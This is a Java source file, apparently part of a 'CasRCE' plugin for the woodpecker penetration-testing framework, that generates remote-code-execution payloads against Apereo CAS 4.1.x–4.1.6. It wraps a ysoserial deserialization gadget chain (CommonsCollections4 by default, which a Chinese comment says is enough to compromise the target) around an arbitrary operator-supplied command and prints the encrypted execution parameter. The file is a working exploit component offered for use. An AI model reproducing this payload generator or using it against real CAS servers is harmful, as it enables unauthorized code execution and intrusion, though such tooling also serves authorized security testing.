package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CasCommonUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CasPayloadGenerate implements IPayloadGenerator {
    public static IResultOutput iResultOutput;
    @Override
    public String getPayloadTabCaption() {
        return "4.1.x-4.1.6 crypter";
    }

    @Override
    public IArgsUsageBinder getPayloadCustomArgs() {
        IArgsUsageBinder binder = CasRCE.callbacks.getPluginHelper().createArgsUsageBinder();
        List<IArg> args = new ArrayList<>();
        final IArg gadge = CasRCE.callbacks.getPluginHelper().createArg();
        gadge.setName("yso_gadget");
        gadge.setDefaultValue("CommonsCollections4");
        gadge.setRequired(true);
        gadge.setDescription("默认用cc4就能打死");

        final IArg shellType = CasRCE.callbacks.getPluginHelper().createArg();
        shellType.setName("yso_cmd");
        shellType.setDefaultValue("sleep:5");
        shellType.setRequired(true);
        shellType.setDescription("yoserial-for-woodpecker命令");

        args.add(gadge);
        args.add(shellType);
        binder.setArgsList(args);
        binder.setUsage("yso_gadget=URLDNS\nshell_type=http://www.baidu.com");
        return binder;
    }

    @Override
    public void generatorPayload(Map<String, Object> customArgs, IResultOutput result) {
        iResultOutput = result;
        String className = (String)customArgs.get("yso_gadget");
        String command = (String)customArgs.get("yso_cmd");

        result.successPrintln("Generate execution parameter data success!");
        result.rawPrintln("\n");
        result.rawPrintln(CasCommonUtils.generate(className, command));
        result.rawPrintln("\n");
    }
}
